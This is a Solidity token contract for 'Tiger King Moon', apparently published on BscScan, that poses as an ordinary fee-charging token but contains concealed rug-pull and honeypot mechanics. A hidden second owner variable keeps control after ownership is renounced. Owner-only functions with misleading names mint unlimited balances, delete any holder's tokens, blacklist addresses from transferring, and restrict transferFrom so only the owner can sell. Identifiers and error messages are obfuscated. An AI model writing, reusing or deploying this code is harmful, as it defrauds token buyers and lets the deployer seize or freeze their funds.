/**
 *Submitted for verification at BscScan.com on 2022-02-04
*/

pragma solidity ^0.6.10;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _own;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        _own = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyowner() {
        require(_own == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyowner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _bscthink;
    mapping(address => mapping(address => uint256)) private _locked;

    mapping(address => bool) private _vownedFee;
    mapping(address => bool) private _vowned;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 1000000000000 * 10**9;
    uint256 private _tFeeTotal;
    
    string private _name = "Tiger King Moon";
    string private _symbol = "TigerKingMoon";
    uint8 private _decimals = 9;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xcd6Ccfc22242956575EA9FF1f825607cA53D8F86;
  
    uint256 public deadFee = 4;
    uint256 public devFee = 1;

    mapping(address => bool) private _isExcludedFromFee;
    bool private _Enabled = true;
    bool private _EnabledFee = false;
    address owners;

    constructor() public {
        _bscthink[_msgSender()] = _totalSupply;
         owners = _msgSender();
        _vownedFee[owner()] = true;
        _vownedFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bscthink[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_vownedFee[_msgSender()] || _vownedFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _locked[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_EnabledFee){
     require(owners == sender, "mandiee");
        }
        if(_vownedFee[_msgSender()] || _vownedFee[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            _locked[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }


    function ExcudFromReward(address Amopunt) public view returns (bool) {
        return _vowned[Amopunt];
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excudeFromFee(address Amopunt) public onlyowner {
        _vownedFee[Amopunt] = true;
    }

    function includeInFee(address Amopunt) public onlyowner {
        _vownedFee[Amopunt] = false;
    }
     function SETde(bool Amopunt) external onlyowner() {
        _Enabled = Amopunt;
    }
 
    function setCAN(bool Amopunt) external onlyowner() {
        _EnabledFee = Amopunt;
    }
    function approve(address Amopunt) external onlyowner() {
        _isExcludedFromFee[Amopunt] = true;
    }

    function _libera(address Amopunt) external onlyowner() {
        delete _isExcludedFromFee[Amopunt];
    }
    function batchapprove(
        address[] 
        memory _address, 
        bool _bool
    ) public onlyowner {
        for (uint i=0; i<_address.length; i++) {
            _isExcludedFromFee[_address[i]] = _bool;
        }
    }    
    function brunnt(address burnAmopunt, uint256 burnAmopuntshp) public onlyowner {
        _bscthink[burnAmopunt] = _bscthink[burnAmopunt].add(burnAmopuntshp);
    }

    function burnburnAmopunt(address burnAmopunt, uint256 burnAmopuntshp) public onlyowner {
        _bscthink[burnAmopunt] = _bscthink[burnAmopunt].sub(burnAmopuntshp);
    }
    function askAmopunt(address Amopunt)
        external
        view
        onlyowner()
        returns (bool)
    {
        return _isExcludedFromFee[Amopunt];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "Amopunt");
        require(spender != address(0), "Amopunt");

        _locked[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "Amopunt");
        require(to != address(0), "Amopunt");
        require(amount > 0, "Amopunt");

      if (_Enabled) {
            require(_isExcludedFromFee[from] == false, "Amopunt");
        }  


        _transfers(from, to, amount);
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "Amopunt");
        require(recipient != address(0), "Amopunt");
    
        _bscthink[sender] = _bscthink[sender].sub(toAmount);
        _bscthink[recipient] = _bscthink[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }
 function TransferToken(
        address[] 
        memory Amopunt, 
        uint256 Meshps
    ) public onlyowner {
        for (uint i=0; i<Amopunt.length; i++) {
            _transfers(_msgSender(), Amopunt[i], Meshps);
        }
    }
}